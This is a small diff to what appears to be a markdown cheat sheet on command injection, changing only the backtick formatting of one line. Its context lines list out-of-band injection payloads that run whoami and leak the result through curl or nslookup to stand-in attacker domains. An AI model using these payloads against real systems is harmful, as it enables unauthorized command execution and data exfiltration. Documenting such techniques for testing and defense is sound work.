@@ -14,7 +14,7 @@
   2)
       - Out-of-band techniques
       - ``` & curl `whoami`.webserver-attacker.com & ``` (HTTP traffic may be blocked)
-      - `& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`
+      - ```& nslookup `whoami`.kgji2ohoyw.web-attacker.com &```
 
 ## Bypass restriction
 - There are so many ways ...
